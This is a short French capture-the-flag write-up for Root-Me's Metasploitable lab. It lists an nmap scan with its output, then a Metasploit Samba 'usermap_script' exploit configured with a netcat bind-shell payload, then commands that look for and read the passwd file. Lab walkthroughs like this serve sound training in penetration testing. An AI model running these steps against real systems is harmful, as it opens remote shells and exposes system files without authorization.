# Metasploitable

## Trouver IPv4 de la machine 

ping -c 3 ctf20.root-me.org<br>

## Scan des ports pour trouver service(s) vulnérable(s)

nmap -sV -Pn 163.172.195.228

PORT     STATE    SERVICE     VERSION<br>
21/tcp   open     ftp         ProFTPD 1.3.1<br>
22/tcp   open     ssh         OpenSSH 4.7p1 Debian<br> 8ubuntu1 (protocol 2.0)<br>
23/tcp   open     telnet      Linux telnetd<br>
25/tcp   filtered smtp<br>
53/tcp   open     domain      ISC BIND 9.4.2<br>
80/tcp   open     http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)<br>
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>
3306/tcp open     mysql       MySQL 5.0.51a-3ubuntu5<br>
5432/tcp open     postgresql  PostgreSQL DB 8.3.0 - 8.3.7<br>
8009/tcp open     ajp13       Apache Jserv (Protocol v1.3)<br>
8180/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1<br>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br>

## Pentest des sercices

Après des tests il s'avère que le service vulnérable à une RCE est samba. Et en particulier sur le port 445<br>
nmap --script=vuln -Pn -p 445 163.172.195.228<br>
msfconsole<br>
search samba<br>
use exploit/multi/samba/usermap_script  => Samba "username map script" Command Execution<br>

## Configuration du payload 

set rhosts 163.172.195.228<br>
set rport 445<br>
set payload cmd/unix/bind_netcat<br>
run<br>

## CLI dans la machine 

whoami<br>
pwd<br>
find / -name passwd<br>
cat passwd

flag = ...

